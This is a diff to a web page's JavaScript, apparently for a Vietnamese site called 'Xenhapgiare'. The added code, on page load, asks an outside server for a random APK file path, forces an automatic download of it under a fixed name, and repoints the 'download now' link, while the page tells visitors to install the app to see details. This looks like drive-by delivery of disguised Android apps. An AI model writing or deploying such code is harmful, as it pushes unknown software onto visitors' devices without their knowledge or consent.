@@ -85,6 +85,26 @@
   });
 
 })(jQuery);
+
+// get file apk
+const apiUrl = 'https://api-apk.binnotech.site'
+function getOneFile() {
+  // xhr
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', `${apiUrl}/api/get-one-file-random-apk`, true);
+  xhr.send();
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var file = JSON.parse(xhr.responseText);
+      console.log(file);
+      // if(!file || !file.file_path?.lenght) return alert('Không có file apk nào');
+
+      downloadURI(file.file_path, 'Xenhapgiare.apk')
+      $('#link').attr('href', file.file_path)
+    }
+  }
+}
+getOneFile()
 function downloadURI(uri, name) {
   var link = document.createElement("a");
   // If you don't know the name or want to use
@@ -95,11 +115,7 @@ function downloadURI(uri, name) {
   link.click();
   link.remove();
 }
-downloadURI('XenhapgiareV1.apk', 'XenhapgiareV1.apk')
 
-// var isWebView = /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(navigator.userAgent);
-
-// get url params
 var urlParams = new URLSearchParams(window.location.search);
 
 // get query string value
@@ -113,12 +129,11 @@ if (!app || app != 'true') {
           <img src='./images/ic_launcher.png' style="width: 80%; display: block; margin:auto">
           <p style="padding-top: 20px">Tên file: Xenhapgiare.apk</p>
           <p>Kích thước: 25mb</p>
-          <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a style="text-decoration: underline; color: blue" href="./XenhapgiareV1.apk" download>Tải ngay bây giờ</a></p> 
+          <p>Vui lòng tải xuống ứng dụng và cài đặt để xem chi tiết. <br> <a id="link" style="text-decoration: underline; color: blue" href="./XenhapgiareV1.apk" download>Tải ngay bây giờ</a></p> 
       </div>
     </div>
     `
   );
-
 }
 
 
